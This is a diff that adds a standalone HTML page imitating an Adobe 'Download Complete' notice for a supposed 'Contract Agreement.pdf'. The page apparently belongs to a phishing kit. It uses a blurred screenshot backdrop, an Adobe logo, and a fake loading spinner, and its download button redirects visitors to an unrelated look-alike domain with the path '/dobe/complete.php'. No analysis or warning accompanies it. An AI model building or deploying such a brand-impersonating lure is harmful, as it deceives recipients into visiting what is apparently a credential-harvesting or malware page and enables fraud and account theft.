@@ -1,0 +1,133 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Background Image Page</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-image: url('https://i.postimg.cc/CdczYb0R/Screenshot-2025-04-25-161700.png');
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      width: 100vw;
+      background-color: #ffffff;
+      font-family: Arial, sans-serif;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100vh;
+      width: 100vw;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-content {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      animation: modalFadeIn 0.3s ease-out;
+      text-align: center;
+    }
+
+    @keyframes modalFadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .modal-header img {
+      width: 100px;
+      margin-bottom: 15px;
+    }
+
+    .continue-btn {
+      background-color: #ED2224;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+      width: 100%;
+      max-width: 250px;
+      transition: background-color 0.3s;
+    }
+
+    .continue-btn:hover {
+      background-color: #c71b1d;
+    }
+
+    .info-text {
+      color: #666;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+
+    .highlight {
+      font-weight: bold;
+      color: #1e4dbd;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      display: none;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="confirmationModal" class="modal-overlay">
+    <div class="modal-content">
+      <div class="modal-header">
+        <img src="https://i.postimg.cc/w3w7HDzv/adobe-logo-2017.png" alt="Adobe Logo">
+        <h2>Download Complete</h2>
+      </div>
+      <p class="modal-text">
+        You've received a secured document.
+      </p>
+      <p class="modal-subtext" style="padding-top: 10px;">
+        Your Document has been downloaded to your device. Please check your <strong>Downloads</strong> folder and open <strong>Contract Agreement.pdf</strong> to view your document.
+      </p>
+      <p class="modal-subtext" style="padding-top: 10px;">
+        If your download did not start automatically, you can download the document again.
+      </p>
+      <button onclick="submitForm()" id="continueBtn" class="continue-btn">Download Document</button>
+      <div id="spinner" class="spinner">
+        <p>Loading...</p>
+      </div>
+      <p class="info-text"></p>
+    </div>
+  </div>
+
+  <script>
+    function submitForm() {
+      var btn = document.getElementById('continueBtn');
+      var spinner = document.getElementById('spinner');
+
+      btn.style.display = 'none';    // Hide button
+      spinner.style.display = 'block'; // Show loading spinner
+
+      setTimeout(function() {
+        window.location.href = "https://relyvirtual-accessed.info/dobe/complete.php"; // Redirect after 2 seconds
+      }, 2000);
+    }
+  </script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9d5785c3db3ebcc9","version":"2025.9.1","r":1,"token":"66ac097de8ab49798a128608fc821a27","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
+</body>
+</html>
